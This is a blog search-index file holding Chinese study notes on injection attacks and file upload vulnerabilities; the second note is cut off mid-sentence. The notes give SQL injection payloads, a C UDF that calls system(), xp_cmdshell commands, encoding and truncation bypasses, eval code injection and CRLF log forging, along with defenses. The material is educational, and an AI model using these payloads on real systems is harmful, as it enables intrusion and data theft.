<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>『注入攻击』Injection</title>
      <link href="/posts/a395.html"/>
      <url>/posts/a395.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ol><li><p><strong>原理</strong></p><p>注入攻击的本质是把用户输入的数据当作代码执行，它有三个关键条件：</p><ul><li><p>用户能够控制输入</p></li><li><p>原本程序要执行的代码，拼接了用户输入的数据</p></li><li><p>变量不存在过滤或者过滤不严谨</p></li></ul></li><li><p><strong>靶场</strong></p><ul><li>sqli-lab</li><li></li></ul></li></ol><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p><p>在这一模块我们将介绍如何检测网站中是否存在SQL注入漏洞</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><ol><li><p><strong>概念</strong></p><p>如果服务器开启了错误回显，可能会披露一些敏感信息以更正确的构造SQL注入语句。</p><ul><li><p><strong>盲注（blind injection）：在没有开启错误回显的情况下来进行的注入攻击</strong>。</p></li><li><p>缺少了回显的调试信息，攻击者必须找到一个方法来验证注入的SQL是否成功执行</p></li></ul></li><li><p><strong>方法</strong></p><p>1）<strong>最常见的盲注：构造简单的条件语句，根据返回页面是否发生变化，来判断SQL语句是否得到执行。</strong></p><p>假设页面URL：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://newspaper.com/items.php?id=2</span><br></pre></td></tr></table></figure><p>执行的SQL为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> title,description,bod <span class="keyword">from</span> items <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span></span><br></pre></td></tr></table></figure><p>假设黑客构造条件语句如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://newspaper.com/items.php?id=2 and 1=2</span><br></pre></td></tr></table></figure><p>此时执行的SQL如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select title,description,bod from items where id=2 and 1=2</span><br></pre></td></tr></table></figure><p>因为 <code>1=2</code> 永远是一个假命题，此时Web应用不会返回结果给用户，黑客看到的页面结果将为空或者是一个出错页面。</p><p>如果黑客继续构造请求</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://newspaper.com/items.php?id=2 and 1=1</span><br></pre></td></tr></table></figure><p>如果页面返回正常了，那么说明SQL语句的”and”成功执行。</p><p>此时可以判断“id”参数存在SQL注入漏洞。</p><p><strong>2）延时注入：攻击者通过引入延迟来推断数据库中的信息。</strong></p><p>利用 mysql 数据库中的 benchmark() 函数，用于测试函数性能，将表达式expr执行count次。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benchmark(count,expr)</span><br></pre></td></tr></table></figure><p>构造payload如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1170</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> IF(<span class="built_in">SUBSTRING</span>(<span class="keyword">CURRENT</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span></span><br><span class="line"><span class="type">CHAR</span>(<span class="number">119</span>),BENCHMARK(<span class="number">5000000</span>,ENCODE(<span class="string">&#x27;MSG&#x27;</span>,<span class="string">&#x27;by 5 seconds&#x27;</span>)),<span class="keyword">null</span>) <span class="keyword">FROM</span> (<span class="keyword">Select</span> Database() <span class="keyword">as</span> <span class="keyword">current</span>) <span class="keyword">as</span> tbl;</span><br></pre></td></tr></table></figure><ul><li><code>IF(condition, true_value, false_value)</code>：这是一个条件判断语句。如果条件为真，则执行<code>true_value</code>，否则执行<code>false_value</code>。</li><li><code>SUBSTRING(CURRENT, 1, 1)</code>：SUBSTRING提取出CURRENT （从后面可以看出表示当前数据库名称）的第一个字符，判断它是不是CHAR(119)，即字母w</li><li><code>BENCHMARK(5000000, ENCODE(&#39;MSG&#39;, &#39;by 5 seconds&#39;))</code>：如果条件为真的话，重复执行<code>BENCHMARK</code>函数造成延时，如果没有的话就会返回null</li></ul><p>这样可以根据页面回显的变化时间来判断数据库名称的第一个字符是不是 w，这样重复遍历可以将整个数据库名全部验证完成。</p><p>类似情况还可以获得有用信息的函数包含</p><ul><li>database()</li><li>system_user()：数据库系统用户</li><li>current_user()：登录数据库的当前用户</li><li>last_insert_id()</li></ul></li></ol><h1 id="数据库攻击技巧"><a href="#数据库攻击技巧" class="headerlink" title="数据库攻击技巧"></a>数据库攻击技巧</h1><p><strong>找到SQL注入漏洞后</strong>，根据不同数据库，进行<strong>后续攻击</strong>的技巧也有所不同。</p><h2 id="常见攻击技巧"><a href="#常见攻击技巧" class="headerlink" title="常见攻击技巧"></a>常见攻击技巧</h2><p>下面一系列的操作比较繁琐，所以一般使用sqlmap进行自动化注入</p><ol><li><p><strong>猜解数据库版本</strong>：</p><p>因为知道了数据库的具体版本后，攻击者可以针对该版本已知的漏洞进行定向攻击。</p><p>MySQL版本如果是4，返回True</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.site.com<span class="operator">/</span>news.php?id<span class="operator">=</span><span class="number">5</span> <span class="keyword">and</span> <span class="built_in">substring</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="number">4</span></span><br></pre></td></tr></table></figure></li><li><p><strong>判断表名是否存在</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">5</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure></li><li><p><strong>判断列名是否存在</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">5</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,passwd <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure></li><li><p><strong>猜测username和password具体值</strong></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240805110109892.png" alt="image-20240805110109892"></p></li><li><p><strong>读写文件</strong></p><p>如果当前数据库用户拥有读写系统相应文件或目录的权限</p><ul><li><p>在mysql中，可以通过Load_file()读取系统文件，通过into dumpfile写入系统文件，最后通过 LOAD DATA INFILE 将文件导入创建的表中，最后就可以通过一般的注入技巧直接操作表数据了。</p><blockquote><p>既然都可以读取系统文件了，为什么不直接读取或写入文件，而是导入表再操作呢：</p><ul><li>导入表中可以结构化处理，更加灵活</li><li>直接操作可能被安全防护机制如IDS检测到</li></ul></blockquote></li><li><p>写入文件技巧，通常被用于直接在服务器上写入一个Webshell，为进一步攻击做铺垫。因此，设计数据库安全方案时，可以禁止普通数据库用户具备操作文件的权限。</p></li></ul></li></ol><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ol><li><p><strong>命令执行方式</strong></p><ul><li>通过<strong>导出webshell</strong>间接地执行命令</li><li>利用<strong>用户自定义函数</strong>，即UDF（User-Defined Function）来执行命令。</li></ul></li><li><p><strong>UDF</strong></p><ul><li><p><strong>概念</strong></p><p><strong>流行的数据库一般都支持从本地文件系统中导入一个共享库文件作为自定义函数</strong></p><p>UDF 命令执行是一种利用数据库自定义函数进行代码执行的攻击方法。攻击者可以通过SQL注入或文件上传漏洞等手段将恶意的自定义函数（通常是用C语言编写的共享库）上传到服务器的数据库中。</p><p>一旦自定义函数被成功注册，用户就可以通过SQL语句调用这些函数来执行任意操作，包括在操作系统级别执行命令。</p></li><li><p><strong>具体例子</strong></p><p>这一整体的流程也已经被集成在了sqlmap上面</p><ul><li><p><strong>1）编写恶意UDF</strong></p><p>首先，攻击者需要编写一个恶意的共享库（通常使用C语言），该共享库实现自定义函数，这些函数可以执行操作系统命令。以下是一个简单的C语言UDF示例，展示了如何在Linux上执行系统命令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sys_exec</span><span class="params">(<span class="type">char</span> *cmd)</span> &#123;</span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译此代码生成一个共享库，例如<code>libudf.so</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o libudf.so -fPIC udf.c</span><br></pre></td></tr></table></figure></li><li><p><strong>2）将UDF加载到数据库中</strong></p><p>攻击者需要将编译好的共享库文件上传到数据库服务器上，这通常可以通过SQL注入或文件上传漏洞实现。</p></li><li><p><strong>3）在数据库中创建和使用UDF</strong></p><p>接下来，攻击者需要在数据库中注册自定义函数。例如在MySQL中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- 创建一个存放UDF库文件的目录（如果没有权限，可以尝试其他可写目录）</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS STRING SONAME <span class="string">&#x27;libudf.so&#x27;</span>;</span><br><span class="line"></span><br><span class="line">-- 调用自定义函数执行命令</span><br><span class="line">SELECT sys_exec(<span class="string">&#x27;id&#x27;</span>);  -- 在Linux系统上，这将执行<span class="string">&#x27;id&#x27;</span>命令并返回结果</span><br></pre></td></tr></table></figure></li><li><p><strong>4）执行系统命令</strong></p><p>一旦自定义函数被成功注册，攻击者可以通过SQL语句调用该函数来执行任意系统命令。</p></li></ul></li></ul></li></ol><h2 id="攻击存储过程"><a href="#攻击存储过程" class="headerlink" title="攻击存储过程"></a>攻击存储过程</h2><ol><li><p><strong>什么是数据库存储过程（Stored Procedure）</strong></p><ul><li><p>SQL语句需要先编译再执行。而存储过程是一组为了完成特定功能的SQL语句集，经编译后存储在数据库中，用户通过指定存储过程的名字并给定参数（如果该存储过程带有参数）来调用执行它。</p></li><li><p>其实就是将sql查询语句封装成一个函数&#x2F;对象的形式，可以直接调用该函数进行相应的查询。这样可以封装复杂的业务逻辑、提高性能、简化代码管理和提高安全性。</p></li></ul><blockquote><p>详细可见：<a href="https://blog.csdn.net/mocas_wang/article/details/109130271">数据库存储过程讲解与实例</a></p></blockquote></li><li><p><strong>利用存储过程进行攻击</strong></p><p>在 MS SQL Server中，可以利用存储过程 xp_cmdshell 执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.dbo.xp_cmdshell &#x27;ping &#x27;;</span><br><span class="line">EXEC master.dbo.xp_cmdshell &#x27;cmd.exe dir c:&#x27;;</span><br></pre></td></tr></table></figure><p>也可以利用 xp_regread 操作注册表</p><p>可以被利用的存储过程包括：</p><ul><li>xp_servicecontrol，允许用户启动、停止服务</li><li>xp_availablemedia，显示机器上有用的驱动器</li><li>xp_dirtree，允许获得一个目录树</li><li>xp_enumdsn，例句服务器上的ODBC数据源</li><li>xp_loginconfig，获取服务器安全信息</li><li>xp_makecab，允许用户在服务器上创建一个压缩文件</li><li>xp_ntsec_enumdomains，列举服务器可以进入的域</li><li>xp_terminate_process，提供进程ID，终止该进程</li></ul></li><li><p><strong>存储过程本身也可能存在漏洞</strong></p><p>有些自定义的存储过程也可能有注入漏洞，可能对外部传入的字段没有进行处理，造成SQL注入问题</p></li></ol><h2 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h2><p>当Web应用、数据库和操作系统使用不相同的字符集和编码，由于各层对字符的理解存在差异，可能会导致不同编码解释从而产生一些安全漏洞。</p><p><strong>具体例子</strong>：</p><ul><li><p>如果Web应用使用PHP处理用户输入，并且使用 <code>addslashes()</code> 函数来转义特殊字符（如单引号 <code>&#39;</code> 等注入常用的闭合符号），则这些转义字符在存储到数据库之前会被加上反斜杠 <code>\</code> 。</p></li><li><p>如果数据库使用GBK编码（双字节字符集），某些字节序列会被解释为一个字符。例如，<code>0xBF27</code> 被解释为一个双字节字符。</p></li><li><p>攻击者可以输入 <code>0xBF27 or 1=1</code> ，经过 <code>addslashes()</code> 处理后，变成 <code>0xBF\27 or 1=1</code> 。在GBK编码中，<code>0xBF5C</code>（ <code>\</code> 的ASCII码是 <code>0x5C</code>）被解释为一个合法的双字节字符，从而吃掉了反斜杠，绕过了转义机制。</p></li></ul><h2 id="SQL-Column-Truncation（列截断）"><a href="#SQL-Column-Truncation（列截断）" class="headerlink" title="SQL Column Truncation（列截断）"></a>SQL Column Truncation（列截断）</h2><ol><li><p><strong>基本概念</strong></p><p>SQL Column Truncation（列截断）是一种利用数据库列长度限制来进行攻击的技术。攻击者可以通过提供特定长度的输入，使数据库在插入或更新数据时对输入进行截断，从而引发潜在的安全问题。以下是对这种攻击方式的详细解释和示例。</p></li><li><p><strong>具体例子</strong></p><p>当 MYSQL 的 sql-mode 设置为 default 时，即没有开启 STRICT_ALL_TABLES 选项时，MYSQL对于用户插入的超长值只会提示 warning 而不是 error（error即插入不成功），仍然会插入数据，如果插入了两个相同的数据就可能会产生鉴权方面的问题。</p><ul><li><p><strong>正常业务</strong></p><p>假设有一个用户注册系统，数据库表定义如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> users (</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">20</span>),</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">20</span>)</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>一个正常的注册请求可能是：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (username, password) <span class="keyword">VALUES</span> (<span class="string">&#x27;alice&#x27;</span>, <span class="string">&#x27;securepassword&#x27;</span>);</span><br></pre></td></tr></table></figure><p>在这种情况下，数据库会将用户名 <code>alice</code> 和密码 <code>securepassword</code> 存储在表中。</p></li><li><p><strong>攻击方法</strong></p><p>如果攻击者发现用户名字段的最大长度是20个字符，他们可以构造一个长度为20个字符的用户名，并在最后添加一个空格：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (username, password) <span class="keyword">VALUES</span> (<span class="string">&#x27;admin               &#x27;</span>, <span class="string">&#x27;anypassword&#x27;</span>);</span><br></pre></td></tr></table></figure><p>数据库接收到上述请求后，由于<code>username</code>字段的长度限制是20个字符，数据库会截断用户名，存储为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;admin               &#x27;</span>  <span class="comment">-- 实际存储的用户名</span></span><br></pre></td></tr></table></figure><p>当攻击者尝试登录时，他们可以仅输入前缀匹配的用户名（例如，<code>admin</code>），数据库在处理查询时可能会忽略后面的空格，从而允许攻击者绕过验证。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;anypassword&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果后续授权过程中，系统仅仅通过用户名来进行授权</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username <span class="operator">=</span> ?</span><br></pre></td></tr></table></figure><p>我们注册的账号就直接拥有了管理员admin权限，产生了越权访问</p></li></ul></li></ol><h1 id="SQL-注入防御"><a href="#SQL-注入防御" class="headerlink" title="SQL 注入防御"></a>SQL 注入防御</h1><h2 id="转义（escape）"><a href="#转义（escape）" class="headerlink" title="转义（escape）"></a>转义（escape）</h2><p><strong>escape的局限性</strong>：</p><p>仅仅对用户输入进行 escape（转义） 处理是不够的，escape采用的是黑名单机制，黑名单无法覆盖所有的过滤字符，用户输入的自然语言中也可能存在HAVING、ORDER BY等SQL保留字，盲目过滤可能导致误杀。</p><p>&#x3D;&#x3D;基于黑名单的过滤方法并不合适&#x3D;&#x3D;</p><h2 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h2><ol><li><p><strong>基本概念</strong></p><p>通过将SQL查询与参数分离来确保用户输入不会被当作SQL代码执行。预编译的核心思想是<strong>将SQL查询的结构固定下来，而将用户输入的数据作为参数处理</strong>，从而避免恶意输入影响SQL查询的结构。</p><ul><li>一般来说，<strong>使用预编译语句是防御SQL注入的最佳方式</strong>，绑定变量保证了SQL语句的语义不会改变。</li></ul></li><li><p><strong>具体例子</strong></p><ul><li><p>PHP中使用预编译</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建数据库连接</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=testdb&#x27;</span>, <span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 准备SQL查询</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = :username AND password = :password&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定参数</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:username&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:password&#x27;</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置参数值</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行查询</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取查询结果</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>Java中使用预编译</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>;</span><br><span class="line">pstmt = conn.prepareStatement(sql);</span><br></pre></td></tr></table></figure><p>使用 <code>?</code> 表示变量</p></li></ul></li></ol><h2 id="使用安全的存储过程"><a href="#使用安全的存储过程" class="headerlink" title="使用安全的存储过程"></a>使用安全的存储过程</h2><p>除了使用预编译语句外，我们还可以使用安全的存储过程对抗SQL注入。</p><p>使用存储过程的效果于使用预编译语句的效果类似，其区别就是存储过程需要先将SQL语句定义在数据库中。</p><p>但需要注意的是，</p><ul><li>存储过程中也可能会存在注入问题，因此应该尽量避免在存储过程内使用动态的SQL语句。</li><li>如果无法避免，则应该使用严格的过滤或者是编码函数来处理用户的输入数据。</li></ul><h2 id="检查数据类型"><a href="#检查数据类型" class="headerlink" title="检查数据类型"></a>检查数据类型</h2><p>对于输入的数据的数据类型进行检查，在很大程度上可以对抗SQL注入。</p><p>例如可以在代码中限制为 integer 类型，所以无法注入</p><p>但是如果需要用户提交的是一段字符串，单纯的数据类型检查就不够用了。</p><h2 id="使用安全函数"><a href="#使用安全函数" class="headerlink" title="使用安全函数"></a>使用安全函数</h2><p>一般来说，各种Web语言都实现了一些编码函数，可以帮助对抗SQL注入。</p><h2 id="数据库自身"><a href="#数据库自身" class="headerlink" title="数据库自身"></a>数据库自身</h2><p>从数据库自身的就角度来说呢，应该使用最小权限原则，避免Web应用直接使用root，dbowner等高权限账户直接连接数据库。</p><p>如果有多个不同的应用在使用同一数据库，则也应该为每个应用分配不同的账户。</p><p>Web应用使用的数据库账户，不应该有创建自定义函数、操作本地文件的权限。</p><h1 id="其他注入攻击"><a href="#其他注入攻击" class="headerlink" title="其他注入攻击"></a>其他注入攻击</h1><p>除了SQL注入以外，还有其他的注入攻击，这些攻击都是违背了“数据与代码分离”的原则。</p><h2 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h2><p>XML是一种标准通用标记语言，通过标签对数据进行结构化表示，其注入方法也与HTML比较类似，主要都是通过闭合标签或者其他符号来完成注入的。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240805153609543.png" alt="image-20240805153609543"></p><p>防御方法也与HTML注入类似，对语言本身的保留字符进行转义即可</p><h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><p>代码注入和命令注入往往都是由一些不安全的函数或者方法引起的，其中的典型代表就是eval()和systrm()。</p><p><strong>具体例子</strong></p><ul><li><p>PHP</p><p>下面这段php代码，从URL的查询参数中获取 <code>arg</code>的值，并将其赋值给变量<code>$x</code>，传递给 eval 函数执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$myvar</span>=<span class="string">&quot;varname&quot;</span>;</span><br><span class="line"><span class="variable">$x</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$myvar=<span class="subst">$x</span>;&quot;</span>);</span><br></pre></td></tr></table></figure><p>假设用户访问的URL是 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?arg=1;phpinfo()</span><br></pre></td></tr></table></figure><p>服务器会执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;\$myvar=1;phpinfo();&quot;</span>);</span><br></pre></td></tr></table></figure><p>输出php的配置信息</p></li><li><p><strong>动态包含（Dynamic Include）</strong></p><p>动态包含是一种在程序运行时动态地包含和执行代码文件的技术。在PHP、JSP等编程语言中，动态包含通常用于在运行时根据条件或配置文件来加载不同的代码文件。然而，这种技术也可能导致代码注入或远程文件包含漏洞，从而使得攻击者能够执行恶意代码。</p><p>PHP、JSP的动态include导致的代码执行，都可以算是一种代码注入。</p><p>例如在JSP中，可以使用 <code>&lt;jsp:include&gt;</code> 标签来动态包含文件，或者使用 <code>RequestDispatcher</code> 类来实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:include page=<span class="string">&quot;&lt;%= request.getParameter(&quot;</span>page<span class="string">&quot;) %&gt;.jsp&quot;</span> /&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><ol><li><p><strong>基本概念</strong></p><p>CR是指回车符 Carriage Return，即 <code>\r </code>。 LF是指换行符 Lined Feed，即 <code>\n</code> 。CRLF常被用作不同语义之间的分隔符，因此通过“注入CRLF字符”就有可能改变原有的语义。</p><ul><li>所有使用CRLF作为分隔符的地方都可能存在这种注入。</li></ul></li><li><p><strong>具体例子</strong></p><ul><li><p><strong>日志：登录失败用户名写入日志文件</strong></p><p>正常情况下的记录如下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username login failed for: guest</span><br><span class="line">Username login failed for: admin</span><br></pre></td></tr></table></figure><p>如果没有处理”\r\n”，使用如下payload插入一条日志记录</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guest\nUsername login succeed for: admin</span><br></pre></td></tr></table></figure><p>结果日志变成。显然第二条记录是伪造的。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Username login failed for: guest</span><br><span class="line">Username login succeed for: admin</span><br></pre></td></tr></table></figure></li><li><p><strong>http头部注入</strong></p><p>在HTTP协议中，HTTP头是通过“\r\n”来分隔的。</p><p>因此如果服务器端没有过滤“\r\n”，而又把用户输入的数据放在HTTP头中，则有可能导致安全隐患。这种在HTTP头中的CRLF注入，又可以称为“Http Response Splitting”。这种注入最常见的情况就是把用户的输入拼接到http response的头部中了。</p></li></ul></li><li><p><strong>防御</strong></p><p>对抗CRLF的方法非常简单。只需要处理好”\r”和”\n”这2个保留字，尤其是使用“换行符”作为分隔符的应用。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务端应用安全 </tag>
            
            <tag> 注入攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『文件上传漏洞』File Upload Vulnerabilities</title>
      <link href="/posts/4981.html"/>
      <url>/posts/4981.html</url>
      
        <content type="html"><![CDATA[<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><ol><li><p><strong>定义</strong></p><p>由于服务器对文件上传路径变量过滤不严，并且对用户上传的文件后缀以及文件类型限制不严，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。</p></li><li><p><strong>攻击条件</strong></p><ul><li>上传的文件能够被Web容器解释执行。上传后的目录是Web容器能覆盖的路径。</li><li>用户能够在Web上访问这个文件</li><li>上传的文件被安全检查、格式化、图片压缩等功能改变了内容，则攻击不成功</li></ul></li><li><p><strong>绕过文件上传检查功能</strong></p><p><strong>1）通过判断文件后缀名完成上传文件安全检查</strong>：黑客可以手动修改上传过程的post包，在文件名后添加一个 <code>%00</code> 字节，截断某些函数对于文件名的判断。</p><p>例子：假设一个web应用仅允许上传 JPG ，例如可以通过手工修改post包，构造文件 <code>xxx.php[\0].jpg</code> 。对于Web应用来说，只会检查文件名的后缀是否符合要求，但是当文件上传到服务器后，服务器端的某些函数在处理文件名时，会将空字节之后的部分截断，因此最终存储在服务器上的文件变成了 <code>xxx.php</code>。攻击者可以利用这个文件执行任意PHP代码，达到攻击目的。</p><p><strong>2）判断上传文件的文件头</strong>：黑客可以伪造一个合法的文件头，把真实的PHP代码附在合法的文件头之后。但是注意这里文件的后缀需要是 <code>.php</code> ，因为后续仍然需要php来解释该文件，如果文件后缀名不是 <code>.php</code> 的话web服务器不会解析。</p></li></ol><h1 id="Web服务器功能漏洞"><a href="#Web服务器功能漏洞" class="headerlink" title="Web服务器功能漏洞"></a>Web服务器功能漏洞</h1><p>web服务器本身存在很多的功能特性，而这些功能特性可以被利用成漏洞进行攻击</p><ol><li><p><strong>Apache文件解析问题</strong></p><ul><li><strong>场景</strong>：在 <code>Apache 1.x</code> 和 <code>Apache 2.x</code> 环境中，当Apache遇到不认识的扩展名时（没有定义在其 <code>/conf/mime.types</code> 文件中），将会从后向前解析，直到碰到认识的扩展名。</li><li><strong>例子</strong>：例如文件名为1.php.aa，首先解析aa扩展名，发现不认识继续向前面遍历，最终识别为1.php。</li><li><strong>漏洞利用</strong>：Apache 